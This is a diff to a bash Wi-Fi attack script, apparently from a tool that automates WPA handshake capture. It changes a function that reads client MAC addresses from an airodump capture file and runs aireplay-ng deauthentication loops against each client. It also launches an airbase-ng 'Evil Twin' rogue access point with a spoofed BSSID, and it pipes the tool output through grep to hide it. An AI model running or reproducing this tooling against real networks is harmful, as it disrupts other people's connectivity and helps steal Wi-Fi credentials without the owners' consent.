@@ -544,9 +544,9 @@ fautocap()																#Deauth targets and collect handshakes
 	fi
 	while [ $DONE -z ] 2> /dev/null
 		do
+			TARGETS="$(cat $HOME/tmp-01.csv | grep Station -A 20 | grep : | cut -d ',' -f 1 | sort -u)"
 			if [ $DEPASS = "1" ] 2> /dev/null
 				then
-					TARGETS="$(cat $HOME/tmp-01.csv | grep Station -A 20 | grep : | cut -d ',' -f 1 | sort -u)"
 					if [ $POWERLIMIT -z ] 2> /dev/null
 						then
 							A=1
@@ -596,9 +596,10 @@ fautocap()																#Deauth targets and collect handshakes
 							for CLIENT in $TARGETS
 								do
 									MACNUM=$((MACNUM + 1))
-									echo $GRN" [*] Client number $MACNUM: $CLIENT"
+									echo
 									sleep 1.8 && killall aireplay-ng 2> /dev/null&
-									echo $BLU;aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1;echo $RST
+									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep sdvds
+									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
 									sleep 1
 								done
 							sleep 3
@@ -619,9 +620,10 @@ fautocap()																#Deauth targets and collect handshakes
 									for CLIENT in $TARGETS
 										do
 											MACNUM=$((MACNUM + 1))
-											echo $GRN" [*] Client number $MACNUM: $CLIENT"
+											echo
 											sleep 2.8 && killall aireplay-ng 2> /dev/null&
-											echo $BLU;aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2;echo $RST
+											aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb
+											echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
 											sleep 1
 										done
 									sleep 3
@@ -638,13 +640,19 @@ fautocap()																#Deauth targets and collect handshakes
 							fi
 							echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched on $GRN$NIC2" 
 							echo $BLU;echo " [>] FIRE ON $NIC! [<] "
-							echo $BLU
-							sleep 1.8 && killall aireplay-ng 2> /dev/null&
-							aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep segeg&
-							echo $RED" [*] $GRN Deauth$RED Launched"
-							sleep 1
-							gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $BSSID -i $MON2 -I 50 -F $HOME/tmpe $MON2&
-							sleep 1
+							FAKEMAC=${BSSID:0:12}'13:37'
+							gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F $HOME/tmpe $MON2&
+							sleep 2
+							for CLIENT in $TARGETS
+								do
+									MACNUM=$((MACNUM + 1))
+									echo
+									sleep 1.8 && killall aireplay-ng 2> /dev/null&
+									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb
+									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
+									sleep 1
+								done
+							sleep 2
 							echo;sleep 8
 					fi
 					
